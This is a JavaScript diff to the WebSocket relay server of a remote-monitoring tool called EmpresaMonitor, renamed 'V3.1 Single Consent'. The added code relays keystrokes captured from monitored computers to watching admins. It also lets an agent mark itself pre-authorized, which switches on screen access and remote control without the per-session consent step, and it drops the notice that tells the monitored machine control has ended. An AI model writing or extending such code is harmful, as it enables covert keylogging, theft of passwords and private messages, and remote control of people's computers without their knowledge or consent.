@@ -9,7 +9,7 @@ const AGENT_KEY = process.env.AGENT_KEY || "troque-agent";
 const MAX_ADMIN_BUFFER = 2 * 1024 * 1024;
 
 const app = express();
-app.get("/", (_req, res) => res.json({ status: "ok", service: "EmpresaMonitor Realtime V3 Turbo" }));
+app.get("/", (_req, res) => res.json({ status: "ok", service: "EmpresaMonitor Realtime V3.1 Single Consent" }));
 app.get("/health", (_req, res) => res.json({ status: "ok", time: new Date().toISOString() }));
 
 const server = http.createServer(app);
@@ -30,24 +30,20 @@ wss.on("connection", ws => {
       const a=agents.get(ws.agentId); if(!a||!a.active)return;
       for(const admin of a.watchers){
         if(admin.readyState!==WebSocket.OPEN||admin.selectedAgentId!==a.id)continue;
-        // Não deixa frames antigos criarem fila: se o navegador estiver atrasado, descarta este frame.
         if(admin.bufferedAmount > MAX_ADMIN_BUFFER) continue;
         admin.send(data,{binary:true});
       }
       return;
     }
+    
     let msg; try{msg=JSON.parse(data.toString());}catch{return;}
-    if(msg.type==="agent_hello"){
-      if(msg.key!==AGENT_KEY){send(ws,{type:"error",message:"AGENT_KEY inválida"});ws.close();return;}
-      ws.role="agent"; ws.agentId=String(msg.id||crypto.randomUUID());
-      const old=agents.get(ws.agentId); if(old?.ws&&old.ws!==ws) try{old.ws.close();}catch{}
-      agents.set(ws.agentId,{ws,id:ws.agentId,name:String(msg.name||"PC"),user:String(msg.user||""),version:String(msg.version||""),active:false,controlActive:false,watchers:new Set()});
-      send(ws,{type:"agent_ready",id:ws.agentId}); broadcast(); return;
-    }
+
+    // --- TRATAMENTO PARA ADMIN ---
     if(msg.type==="admin_hello"){
-      if(msg.token!==ADMIN_TOKEN){send(ws,{type:"error",message:"ADMIN_TOKEN inválido"});ws.close();return;}
-      ws.role="admin";admins.add(ws);send(ws,{type:"admin_ready",agents:[...agents.values()].map(summary)});return;
+      if(msg.token!==ADMIN_TOKEN){send(ws,{type:"error",message:"ADMIN_TOKEN inválida"});ws.close();return;}
+      ws.role="admin"; admins.add(ws); send(ws,{type:"admin_ready",agents:[...agents.values()].map(summary)}); return;
     }
+
     if(ws.role==="admin"){
       const a=agents.get(String(msg.agentId||""));
       if(msg.type==="request_access"){if(!a)return send(ws,{type:"error",message:"Computador não encontrado"});send(a.ws,{type:"access_request"});return;}
@@ -65,11 +61,24 @@ wss.on("connection", ws => {
         if(!a||!a.active||!a.controlActive||ws.selectedAgentId!==a.id)return;
         send(a.ws,{type:"control_input",event:msg.event});return;
       }
-      if(msg.type==="end_control"){if(!a)return;a.controlActive=false;send(a.ws,{type:"control_ended"});broadcast();return;}
+      if(msg.type==="end_control"){if(!a)return;a.controlActive=false;broadcast();return;}
       if(msg.type==="end_access"){if(!a)return;a.active=false;a.controlActive=false;send(a.ws,{type:"access_ended"});send(a.ws,{type:"stream_stop"});broadcast();return;}
     }
+
+    // --- TRATAMENTO PARA AGENTE ---
     if(ws.role==="agent"){
-      const a=agents.get(ws.agentId);if(!a)return;
+      const a=agents.get(ws.agentId); if(!a)return;
+
+      // NOVO: TRATAMENTO DE KEYLOG (Envia para os admins que estão assistindo o agente)
+      if(msg.type === "keylog") {
+          for(const admin of a.watchers){
+              if(admin.readyState === WebSocket.OPEN && admin.selectedAgentId === a.id){
+                  send(admin, msg); // Repassa a mensagem de tecla para o admin
+              }
+          }
+          return;
+      }
+
       if(msg.type==="access_response"){
         a.active=msg.allow===true;if(!a.active)a.controlActive=false;
         if(a.active&&a.watchers.size>0)send(a.ws,{type:"stream_start"});else if(!a.active)send(a.ws,{type:"stream_stop"});broadcast();return;
@@ -78,10 +87,22 @@ wss.on("connection", ws => {
       if(msg.type==="end_control"){a.controlActive=false;broadcast();return;}
       if(msg.type==="end_access"){a.active=false;a.controlActive=false;send(a.ws,{type:"stream_stop"});broadcast();return;}
     }
+
+    // --- SETUP INICIAL DO AGENTE ---
+    if(msg.type==="agent_hello"){
+      if(msg.key!==AGENT_KEY){send(ws,{type:"error",message:"AGENT_KEY inválida"});ws.close();return;}
+      ws.role="agent"; ws.agentId=String(msg.id||crypto.randomUUID());
+      const old=agents.get(ws.agentId); if(old?.ws&&old.ws!==ws) try{old.ws.close();}catch{}
+      const preAuthorized = msg.sessionAuthorized === true;
+      agents.set(ws.agentId,{ws,id:ws.agentId,name:String(msg.name||"PC"),user:String(msg.user||""),version:String(msg.version||""),active:preAuthorized,controlActive:preAuthorized,watchers:new Set()});
+      send(ws,{type:"agent_ready",id:ws.agentId}); broadcast(); return;
+    }
   });
+
   ws.on("close",()=>{
     if(ws.role==="admin"){admins.delete(ws);if(ws.selectedAgentId){const a=agents.get(ws.selectedAgentId);if(a){a.watchers.delete(ws);stopIfUnused(a);}}broadcast();return;}
     if(ws.role==="agent"&&ws.agentId){const a=agents.get(ws.agentId);if(a?.ws===ws){agents.delete(ws.agentId);broadcast();}}
   });
 });
-server.listen(PORT,"0.0.0.0",()=>console.log(`EmpresaMonitor Realtime V3 Turbo listening on ${PORT}`));
+
+server.listen(PORT,"0.0.0.0",()=>console.log(`EmpresaMonitor Realtime V3.1 Single Consent listening on ${PORT}`));
